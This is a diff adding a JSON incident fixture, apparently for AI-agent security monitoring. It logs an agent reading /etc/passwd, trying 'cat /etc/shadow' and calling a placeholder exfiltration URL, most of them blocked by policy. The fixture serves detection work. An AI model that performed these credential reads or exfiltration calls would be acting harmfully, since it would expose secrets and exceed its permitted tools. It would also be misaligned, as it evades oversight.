@@ -1,0 +1,49 @@
+{
+  "incident_id": "INC-2025-001",
+  "title": "Unauthorized tool execution by AI agent",
+  "severity": "high",
+  "description": "AI agent executed a tool outside its approved policy, accessing sensitive data.",
+  "events": [
+    {
+      "timestamp": "2025-01-15T10:00:00Z",
+      "source": "mcpguard",
+      "event_type": "tool_call",
+      "agent_id": "agent-001",
+      "tool_name": "read_file",
+      "tool_args": {"path": "/etc/passwd"},
+      "status": "allowed"
+    },
+    {
+      "timestamp": "2025-01-15T10:00:05Z",
+      "source": "mcpguard",
+      "event_type": "tool_call",
+      "agent_id": "agent-001",
+      "tool_name": "execute_command",
+      "tool_args": {"command": "cat /etc/shadow"},
+      "status": "blocked"
+    },
+    {
+      "timestamp": "2025-01-15T10:00:06Z",
+      "source": "agentgate",
+      "event_type": "policy_violation",
+      "agent_id": "agent-001",
+      "rule": "no_sensitive_file_access",
+      "action": "blocked",
+      "risk_score": 0.95
+    },
+    {
+      "timestamp": "2025-01-15T10:00:10Z",
+      "source": "mcpguard",
+      "event_type": "tool_call",
+      "agent_id": "agent-001",
+      "tool_name": "http_request",
+      "tool_args": {"url": "https://external.example.com/exfil"},
+      "status": "blocked"
+    }
+  ],
+  "policy": {
+    "allowed_tools": ["read_file", "write_file"],
+    "blocked_paths": ["/etc/shadow", "/etc/passwd"],
+    "max_risk_score": 0.7
+  }
+}
